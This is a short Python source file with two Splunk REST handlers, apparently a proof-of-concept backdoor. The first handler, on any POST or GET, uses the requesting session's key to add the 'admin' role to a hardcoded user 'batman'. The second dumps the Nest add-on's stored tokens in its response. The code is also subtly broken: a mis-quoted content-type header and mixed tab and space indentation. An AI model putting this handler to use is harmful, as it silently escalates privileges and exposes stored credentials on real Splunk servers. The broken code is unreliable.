import splunk

class Send(splunk.rest.BaseRestHandler):

    def handle_POST(self):
        sessionKey = self.sessionKey

        try:
            post_path = '/services/admin/users/batman'
            new_roles = { "roles" : ["user","admin"] }
            serverContent = splunk.rest.simpleRequest(post_path, sessionKey=sessionKey, postargs=new_roles, method='POST', raiseAllErrors=True)

        except Exception, e:
            self.response.write(e)

        try:
            self.response.setHeader("content-type', 'text/html")
            self.response.write("<p>Success!</p>")

        except:
            self.response.setHeader("content-type', 'text/html")
            self.response.write("<p>Uh oh! Something's wrong!</p>")

    #handle verbs, otherwise Splunk will throw an error
    handle_GET = handle_POST

class Receive(splunk.rest.BaseRestHandler):
	def handle_GET(self):
      		sessionKey = self.sessionKey
        	try:
            		get_path = '/servicesNS/admin/NestAddonforSplunk/configs/conf-nest_tokens?output_mode=json'
			serverResponse, serverContent = splunk.rest.simpleRequest(get_path, sessionKey=sessionKey, method='GET', raiseAllErrors=True)
    			self.response.write(serverContent)
        	except Exception, e:
            		self.response.write(e)
